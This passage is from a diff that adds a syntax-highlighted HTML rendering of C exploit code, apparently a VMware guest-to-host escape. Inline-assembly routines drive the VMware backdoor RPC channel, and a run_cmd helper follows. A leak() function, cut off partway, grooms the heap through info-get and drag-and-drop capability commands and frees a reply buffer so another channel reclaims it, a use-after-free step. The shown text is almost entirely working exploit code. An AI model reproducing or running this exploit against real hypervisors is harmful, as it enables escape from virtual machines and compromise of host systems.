+        <span class="o">:</span><span class="s">&quot;%rax&quot;</span><span class="p">,</span><span class="s">&quot;%rbx&quot;</span><span class="p">,</span><span class="s">&quot;%rcx&quot;</span><span class="p">,</span><span class="s">&quot;%rdx&quot;</span><span class="p">,</span><span class="s">&quot;%rsi&quot;</span><span class="p">,</span><span class="s">&quot;%rdi&quot;</span><span class="p">,</span><span class="s">&quot;%r10&quot;</span>
+       <span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">channel_send_data</span><span class="p">(</span><span class="kt">int</span> <span class="n">cookie1</span><span class="p">,</span><span class="kt">int</span> <span class="n">cookie2</span><span class="p">,</span><span class="kt">int</span> <span class="n">channel_num</span><span class="p">,</span><span class="kt">int</span> <span class="n">len</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span><span class="kt">int</span> <span class="o">*</span><span class="n">res</span><span class="p">){</span>
+    <span class="k">asm</span><span class="p">(</span><span class="s">&quot;pushq %%rbp</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movq %%r9,%%r10</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movq %%r8,%%rbp</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movq %%rcx,%%r11</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movq $0,%%r12</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;1:</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movq %%r8,%%rbp</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;add %%r12,%%rbp</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movl (%%rbp),%%ebx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movl $0x564d5868,%%eax</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movl $0x0002001e,%%ecx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movw $0x5658,%%dx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;out %%eax,%%dx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;addq $4,%%r12</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;cmpq %%r12,%%r11</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;ja 1b</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movl %%ecx,(%%r10)</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;popq %%rbp</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="o">:</span>
+        <span class="o">:</span>
+        <span class="o">:</span><span class="s">&quot;%rax&quot;</span><span class="p">,</span><span class="s">&quot;%rbx&quot;</span><span class="p">,</span><span class="s">&quot;%rcx&quot;</span><span class="p">,</span><span class="s">&quot;%rdx&quot;</span><span class="p">,</span><span class="s">&quot;%rsi&quot;</span><span class="p">,</span><span class="s">&quot;%rdi&quot;</span><span class="p">,</span><span class="s">&quot;%r10&quot;</span><span class="p">,</span><span class="s">&quot;%r11&quot;</span><span class="p">,</span><span class="s">&quot;%r12&quot;</span>
+        <span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">channel_recv_reply_len</span><span class="p">(</span><span class="kt">int</span> <span class="n">cookie1</span><span class="p">,</span><span class="kt">int</span> <span class="n">cookie2</span><span class="p">,</span><span class="kt">int</span> <span class="n">channel_num</span><span class="p">,</span><span class="kt">int</span> <span class="o">*</span><span class="n">len</span><span class="p">,</span><span class="kt">int</span> <span class="o">*</span><span class="n">res</span><span class="p">){</span>
+    <span class="k">asm</span><span class="p">(</span><span class="s">&quot;movl %%eax,%%ebx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movq %%r8,%%r10</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movq %%rcx,%%r11</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movl $0x564d5868,%%eax</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movl $0x0003001e,%%ecx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movw $0x5658,%%dx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;out %%eax,%%dx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movl %%ecx,(%%r10)</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movl %%ebx,(%%r11)</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="o">:</span>
+        <span class="o">:</span>
+        <span class="o">:</span><span class="s">&quot;%rax&quot;</span><span class="p">,</span><span class="s">&quot;%rbx&quot;</span><span class="p">,</span><span class="s">&quot;%rcx&quot;</span><span class="p">,</span><span class="s">&quot;%rdx&quot;</span><span class="p">,</span><span class="s">&quot;%rsi&quot;</span><span class="p">,</span><span class="s">&quot;%rdi&quot;</span><span class="p">,</span><span class="s">&quot;%r10&quot;</span><span class="p">,</span><span class="s">&quot;%r11&quot;</span>
+       <span class="p">);</span>
+
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">channel_recv_data</span><span class="p">(</span><span class="kt">int</span> <span class="n">cookie1</span><span class="p">,</span><span class="kt">int</span> <span class="n">cookie2</span><span class="p">,</span><span class="kt">int</span> <span class="n">channel_num</span><span class="p">,</span><span class="kt">int</span> <span class="n">offset</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span><span class="kt">int</span> <span class="o">*</span><span class="n">res</span><span class="p">){</span>
+    <span class="k">asm</span><span class="p">(</span><span class="s">&quot;pushq %%rbp</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movq %%r9,%%r10</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movq %%r8,%%rbp</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movq %%rcx,%%r11</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movq $1,%%rbx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movl $0x564d5868,%%eax</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movl $0x0004001e,%%ecx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movw $0x5658,%%dx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;in %%dx,%%eax</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;add %%r11,%%rbp</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movl %%ebx,(%%rbp)</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movl %%ecx,(%%r10)</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;popq %%rbp</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="o">:</span>
+        <span class="o">:</span>
+        <span class="o">:</span><span class="s">&quot;%rax&quot;</span><span class="p">,</span><span class="s">&quot;%rbx&quot;</span><span class="p">,</span><span class="s">&quot;%rcx&quot;</span><span class="p">,</span><span class="s">&quot;%rdx&quot;</span><span class="p">,</span><span class="s">&quot;%rsi&quot;</span><span class="p">,</span><span class="s">&quot;%rdi&quot;</span><span class="p">,</span><span class="s">&quot;%r10&quot;</span><span class="p">,</span><span class="s">&quot;%r11&quot;</span><span class="p">,</span><span class="s">&quot;%r12&quot;</span>
+       <span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">channel_recv_finish</span><span class="p">(</span><span class="kt">int</span> <span class="n">cookie1</span><span class="p">,</span><span class="kt">int</span> <span class="n">cookie2</span><span class="p">,</span><span class="kt">int</span> <span class="n">channel_num</span><span class="p">,</span><span class="kt">int</span> <span class="o">*</span><span class="n">res</span><span class="p">){</span>
+    <span class="k">asm</span><span class="p">(</span><span class="s">&quot;movl %%eax,%%ebx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movq %%rcx,%%r10</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movq $0x1,%%rbx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movl $0x564d5868,%%eax</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movl $0x0005001e,%%ecx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movw $0x5658,%%dx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;out %%eax,%%dx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movl %%ecx,(%%r10)</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="o">:</span>
+        <span class="o">:</span>
+        <span class="o">:</span><span class="s">&quot;%rax&quot;</span><span class="p">,</span><span class="s">&quot;%rbx&quot;</span><span class="p">,</span><span class="s">&quot;%rcx&quot;</span><span class="p">,</span><span class="s">&quot;%rdx&quot;</span><span class="p">,</span><span class="s">&quot;%rsi&quot;</span><span class="p">,</span><span class="s">&quot;%rdi&quot;</span><span class="p">,</span><span class="s">&quot;%r10&quot;</span>
+       <span class="p">);</span>
+<span class="p">}</span>
+<span class="kt">void</span> <span class="nf">channel_recv_finish2</span><span class="p">(</span><span class="kt">int</span> <span class="n">cookie1</span><span class="p">,</span><span class="kt">int</span> <span class="n">cookie2</span><span class="p">,</span><span class="kt">int</span> <span class="n">channel_num</span><span class="p">,</span><span class="kt">int</span> <span class="o">*</span><span class="n">res</span><span class="p">){</span>
+    <span class="k">asm</span><span class="p">(</span><span class="s">&quot;movl %%eax,%%ebx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movq %%rcx,%%r10</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movq $0x21,%%rbx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movl $0x564d5868,%%eax</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movl $0x0005001e,%%ecx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movw $0x5658,%%dx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;out %%eax,%%dx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movl %%ecx,(%%r10)</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="o">:</span>
+        <span class="o">:</span>
+        <span class="o">:</span><span class="s">&quot;%rax&quot;</span><span class="p">,</span><span class="s">&quot;%rbx&quot;</span><span class="p">,</span><span class="s">&quot;%rcx&quot;</span><span class="p">,</span><span class="s">&quot;%rdx&quot;</span><span class="p">,</span><span class="s">&quot;%rsi&quot;</span><span class="p">,</span><span class="s">&quot;%rdi&quot;</span><span class="p">,</span><span class="s">&quot;%r10&quot;</span>
+       <span class="p">);</span>
+<span class="p">}</span>
+<span class="kt">void</span> <span class="nf">channel_close</span><span class="p">(</span><span class="kt">int</span> <span class="n">cookie1</span><span class="p">,</span><span class="kt">int</span> <span class="n">cookie2</span><span class="p">,</span><span class="kt">int</span> <span class="n">channel_num</span><span class="p">,</span><span class="kt">int</span> <span class="o">*</span><span class="n">res</span><span class="p">){</span>
+    <span class="k">asm</span><span class="p">(</span><span class="s">&quot;movl %%eax,%%ebx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movq %%rcx,%%r10</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movl $0x564d5868,%%eax</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movl $0x0006001e,%%ecx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movw $0x5658,%%dx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;out %%eax,%%dx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movl %%ecx,(%%r10)</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="o">:</span>
+        <span class="o">:</span>
+        <span class="o">:</span><span class="s">&quot;%rax&quot;</span><span class="p">,</span><span class="s">&quot;%rbx&quot;</span><span class="p">,</span><span class="s">&quot;%rcx&quot;</span><span class="p">,</span><span class="s">&quot;%rdx&quot;</span><span class="p">,</span><span class="s">&quot;%rsi&quot;</span><span class="p">,</span><span class="s">&quot;%rdi&quot;</span><span class="p">,</span><span class="s">&quot;%r10&quot;</span>
+       <span class="p">);</span>
+<span class="p">}</span>
+<span class="k">struct</span> <span class="n">channel</span><span class="p">{</span>
+    <span class="kt">int</span> <span class="n">cookie1</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">cookie2</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">num</span><span class="p">;</span>
+<span class="p">};</span>
+<span class="kt">uint64_t</span> <span class="n">heap</span> <span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+<span class="kt">uint64_t</span> <span class="n">text</span> <span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+<span class="kt">void</span> <span class="nf">run_cmd</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">cmd</span><span class="p">){</span>
+    <span class="k">struct</span> <span class="n">channel</span> <span class="n">tmp</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">res</span><span class="p">,</span><span class="n">len</span><span class="p">,</span><span class="n">i</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">;</span>
+    <span class="n">channel_open</span><span class="p">(</span><span class="o">&amp;</span><span class="n">tmp</span><span class="p">.</span><span class="n">cookie1</span><span class="p">,</span><span class="o">&amp;</span><span class="n">tmp</span><span class="p">.</span><span class="n">cookie2</span><span class="p">,</span><span class="o">&amp;</span><span class="n">tmp</span><span class="p">.</span><span class="n">num</span><span class="p">,</span><span class="o">&amp;</span><span class="n">res</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">res</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;fail to open channel!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">channel_set_len</span><span class="p">(</span><span class="n">tmp</span><span class="p">.</span><span class="n">cookie1</span><span class="p">,</span><span class="n">tmp</span><span class="p">.</span><span class="n">cookie2</span><span class="p">,</span><span class="n">tmp</span><span class="p">.</span><span class="n">num</span><span class="p">,</span><span class="n">strlen</span><span class="p">(</span><span class="n">cmd</span><span class="p">),</span><span class="o">&amp;</span><span class="n">res</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">res</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;fail to set len</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">channel_send_data</span><span class="p">(</span><span class="n">tmp</span><span class="p">.</span><span class="n">cookie1</span><span class="p">,</span><span class="n">tmp</span><span class="p">.</span><span class="n">cookie2</span><span class="p">,</span><span class="n">tmp</span><span class="p">.</span><span class="n">num</span><span class="p">,</span><span class="n">strlen</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span><span class="o">+</span><span class="mh">0x10</span><span class="p">,</span><span class="n">cmd</span><span class="p">,</span><span class="o">&amp;</span><span class="n">res</span><span class="p">);</span>
+
+    <span class="n">channel_recv_reply_len</span><span class="p">(</span><span class="n">tmp</span><span class="p">.</span><span class="n">cookie1</span><span class="p">,</span><span class="n">tmp</span><span class="p">.</span><span class="n">cookie2</span><span class="p">,</span><span class="n">tmp</span><span class="p">.</span><span class="n">num</span><span class="p">,</span><span class="o">&amp;</span><span class="n">len</span><span class="p">,</span><span class="o">&amp;</span><span class="n">res</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">res</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;fail to recv data len</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;recv len:%d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">len</span><span class="p">);</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">len</span><span class="o">+</span><span class="mh">0x10</span><span class="p">);</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">len</span><span class="o">+</span><span class="mh">0x10</span><span class="p">);</span>
+    <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">len</span><span class="o">+</span><span class="mh">0x10</span><span class="p">;</span><span class="n">i</span><span class="o">+=</span><span class="mi">4</span><span class="p">){</span>
+        <span class="n">channel_recv_data</span><span class="p">(</span><span class="n">tmp</span><span class="p">.</span><span class="n">cookie1</span><span class="p">,</span><span class="n">tmp</span><span class="p">.</span><span class="n">cookie2</span><span class="p">,</span><span class="n">tmp</span><span class="p">.</span><span class="n">num</span><span class="p">,</span><span class="n">i</span><span class="p">,</span><span class="n">data</span><span class="p">,</span><span class="o">&amp;</span><span class="n">res</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;recv data:%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">data</span><span class="p">);</span>
+    <span class="n">channel_recv_finish</span><span class="p">(</span><span class="n">tmp</span><span class="p">.</span><span class="n">cookie1</span><span class="p">,</span><span class="n">tmp</span><span class="p">.</span><span class="n">cookie2</span><span class="p">,</span><span class="n">tmp</span><span class="p">.</span><span class="n">num</span><span class="p">,</span><span class="o">&amp;</span><span class="n">res</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">res</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;fail to recv finish</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">channel_close</span><span class="p">(</span><span class="n">tmp</span><span class="p">.</span><span class="n">cookie1</span><span class="p">,</span><span class="n">tmp</span><span class="p">.</span><span class="n">cookie2</span><span class="p">,</span><span class="n">tmp</span><span class="p">.</span><span class="n">num</span><span class="p">,</span><span class="o">&amp;</span><span class="n">res</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">res</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;fail to close channel</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="kt">void</span> <span class="nf">leak</span><span class="p">(){</span>
+    <span class="k">struct</span> <span class="n">channel</span> <span class="n">chan</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
+    <span class="kt">int</span> <span class="n">res</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">len</span><span class="p">,</span><span class="n">i</span><span class="p">;</span>  
+    <span class="kt">char</span> <span class="n">pay</span><span class="p">[</span><span class="mi">8192</span><span class="p">];</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">s1</span> <span class="o">=</span> <span class="s">&quot;info-set guestinfo.a AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">s2</span> <span class="o">=</span> <span class="s">&quot;info-get guestinfo.a&quot;</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">s3</span> <span class="o">=</span> <span class="s">&quot;1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">s4</span> <span class="o">=</span> <span class="s">&quot;tools.capability.dnd_version 4&quot;</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">s5</span> <span class="o">=</span> <span class="s">&quot;vmx.capability.dnd_version&quot;</span><span class="p">;</span>
+    <span class="c1">//init data</span>
+    <span class="n">run_cmd</span><span class="p">(</span><span class="n">s1</span><span class="p">);</span> <span class="c1">// set the message len to be 0x100, so when we call info-get ,we will call malloc(0x100);</span>
+    <span class="n">run_cmd</span><span class="p">(</span><span class="n">s4</span><span class="p">);</span>
+
+
+    <span class="c1">//first step </span>
+    <span class="n">channel_open</span><span class="p">(</span><span class="o">&amp;</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">cookie1</span><span class="p">,</span><span class="o">&amp;</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">cookie2</span><span class="p">,</span><span class="o">&amp;</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">num</span><span class="p">,</span><span class="o">&amp;</span><span class="n">res</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">res</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;fail to open channel!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">channel_set_len</span><span class="p">(</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">cookie1</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">cookie2</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">num</span><span class="p">,</span><span class="n">strlen</span><span class="p">(</span><span class="n">s2</span><span class="p">),</span><span class="o">&amp;</span><span class="n">res</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">res</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;fail to set len</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">channel_send_data</span><span class="p">(</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">cookie1</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">cookie2</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">num</span><span class="p">,</span><span class="n">strlen</span><span class="p">(</span><span class="n">s2</span><span class="p">),</span><span class="n">s2</span><span class="p">,</span><span class="o">&amp;</span><span class="n">res</span><span class="p">);</span>
+    <span class="n">channel_recv_reply_len</span><span class="p">(</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">cookie1</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">cookie2</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">num</span><span class="p">,</span><span class="o">&amp;</span><span class="n">len</span><span class="p">,</span><span class="o">&amp;</span><span class="n">res</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">res</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;fail to recv data len</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;recv len:%d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">len</span><span class="p">);</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">len</span><span class="o">+</span><span class="mh">0x10</span><span class="p">);</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">len</span><span class="o">+</span><span class="mh">0x10</span><span class="p">);</span>
+    <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">len</span><span class="o">+</span><span class="mh">0x10</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
+        <span class="n">channel_recv_data</span><span class="p">(</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">cookie1</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">cookie2</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">num</span><span class="p">,</span><span class="n">i</span><span class="p">,</span><span class="n">data</span><span class="p">,</span><span class="o">&amp;</span><span class="n">res</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;recv data:%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">data</span><span class="p">);</span>
+    <span class="c1">//second step free the reply and let the other channel get it.</span>
+
+    <span class="n">channel_open</span><span class="p">(</span><span class="o">&amp;</span><span class="n">chan</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">cookie1</span><span class="p">,</span><span class="o">&amp;</span><span class="n">chan</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">cookie2</span><span class="p">,</span><span class="o">&amp;</span><span class="n">chan</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">num</span><span class="p">,</span><span class="o">&amp;</span><span class="n">res</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">res</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;fail to open channel!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">channel_set_len</span><span class="p">(</span><span class="n">chan</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">cookie1</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">cookie2</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">num</span><span class="p">,</span><span class="n">strlen</span><span class="p">(</span><span class="n">s2</span><span class="p">),</span><span class="o">&amp;</span><span class="n">res</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">res</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;fail to set len</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">channel_send_data</span><span class="p">(</span><span class="n">chan</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">cookie1</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">cookie2</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">num</span><span class="p">,</span><span class="n">strlen</span><span class="p">(</span><span class="n">s2</span><span class="p">)</span><span class="o">-</span><span class="mi">4</span><span class="p">,</span><span class="n">s2</span><span class="p">,</span><span class="o">&amp;</span><span class="n">res</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">res</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;fail to send data</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">//free the output buffer</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Freeing the buffer....,bp:0x5555556DD3EF</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
